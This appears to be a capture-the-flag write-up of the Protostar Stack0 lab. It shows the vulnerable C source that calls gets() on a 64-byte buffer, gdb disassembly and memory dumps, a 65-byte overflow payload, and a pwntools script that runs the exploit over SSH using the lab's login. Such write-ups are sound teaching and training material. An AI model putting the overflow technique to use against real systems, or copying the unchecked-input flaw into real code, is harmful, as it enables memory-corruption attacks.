---
title: Protostar - Stack0
description: My writeup on stack0 challenge.
categories:
 - binary exploitation
tags: binary exploitation, protostar
---

You can find the protostar there > [Protostar](https://exploit-exercises.lains.space/protostar/){:target="_blank"}

We have the source code of the binary :

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

We have a variable called `buffer` and has 64bytes buffer. Also we have another variable called `modified` and has `0` value.

Then we have the vulnerable `gets` function. 

`gets` doesn't check while getting bytes.

Then we have an if statement that checks if the value of `modified` is not `0`. So we have to change the value of that variable.

Let's fire up `gdb`.

```bash
user@protostar:/opt/protostar/bin$ gdb -q ./stack0
Reading symbols from /opt/protostar/bin/stack0...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
End of assembler dump.
(gdb)
```

We can see there the vulnerable `gets()` function : 
```bash
0x0804840c <main+24>:   call   0x804830c <gets@plt>
```

Let's add a `breakpoint` after the `gets()` function & execute it.

```bash
(gdb) break *0x08048411
Breakpoint 1 at 0x8048411: file stack0/stack0.c, line 13.
(gdb) r
Starting program: /opt/protostar/bin/stack0
AAAAAAAAAAA

Breakpoint 1, main (argc=1, argv=0xbffff864) at stack0/stack0.c:13
13      stack0/stack0.c: No such file or directory.
        in stack0/stack0.c
(gdb)
```

Let's check now the `ESP` register.

```bash
(gdb) x/40x $esp
0xbffff750:     0xbffff76c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff760:     0xb7fd7ff4      0xb7ec6165      0xbffff778      0x41414141
0xbffff770:     0x41414141      0x00414141      0xbffff788      0x080482e8
0xbffff780:     0xb7ff1040      0x08049620      0xbffff7b8      0x08048469
0xbffff790:     0xb7fd8304      0xb7fd7ff4      0x08048450      0xbffff7b8
0xbffff7a0:     0xb7ec6365      0xb7ff1040      0x0804845b      0x00000000
0xbffff7b0:     0x08048450      0x00000000      0xbffff838      0xb7eadc76
0xbffff7c0:     0x00000001      0xbffff864      0xbffff86c      0xb7fe1848
0xbffff7d0:     0xbffff820      0xffffffff      0xb7ffeff4      0x0804824b
0xbffff7e0:     0x00000001      0xbffff820      0xb7ff0626      0xb7fffab0
(gdb)
```

We can see this `0x41414141` digits in memory. `0x41 = A`

```python
>>> "41".decode("hex")
'A'
```

Also we can see `0x00000000` value, that's probably the `modified = 0` variable.

Now let's input more than 64bytes.

```bash
(gdb) shell python -c 'print "A" * 65'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
(gdb) r
Starting program: /opt/protostar/bin/stack0

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Breakpoint 1, main (argc=1, argv=0xbffff864) at stack0/stack0.c:13
13      stack0/stack0.c: No such file or directory.
        in stack0/stack0.c
(gdb) x/40x $esp
0xbffff750:     0xbffff76c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff760:     0xb7fd7ff4      0xb7ec6165      0xbffff778      0x41414141
0xbffff770:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff780:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff790:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x00000041
0xbffff7b0:     0x08048450      0x00000000      0xbffff838      0xb7eadc76
0xbffff7c0:     0x00000001      0xbffff864      0xbffff86c      0xb7fe1848
0xbffff7d0:     0xbffff820      0xffffffff      0xb7ffeff4      0x0804824b
0xbffff7e0:     0x00000001      0xbffff820      0xb7ff0626      0xb7fffab0
(gdb) c
Continuing.
you have changed the 'modified' variable

Program exited with code 051.
(gdb)
```

We can see memory is now full of our `0x41 = A` and the `0x00000000` value, now is overwritten with single 0x41 value, that means we got the flag.

```bash
user@protostar:/opt/protostar/bin$ python -c 'print "A" * 65' | ./stack0
you have changed the 'modified' variable
```

Let's write an exploit now with `pwntools`.

```python
from pwn import *

shell = ssh('user', '$private_ip', password='user', port=22)
sh = shell.run('sh')
log.info('sending payload..')
sh.sendline('/opt/protostar/bin/stack0')
#python -c 'print "A" * 65'
sh.sendline('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
log.success(sh.recvline())
shell.close()
```

```bash
$ python3 exp.py 
[+] Connecting to $private_ip on port 22: Done
[*] user@$private_ip:
    Distro    Unknown Unknown
    OS:       Unknown
    Arch:     Unknown
    Version:  0.0.0
    ASLR:     Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[+] Opening new channel: 'sh': Done
[*] sending payload..
[+] b"$ you have changed the 'modified' variable\n"
[*] Closed connection to '$private_ip
```
=
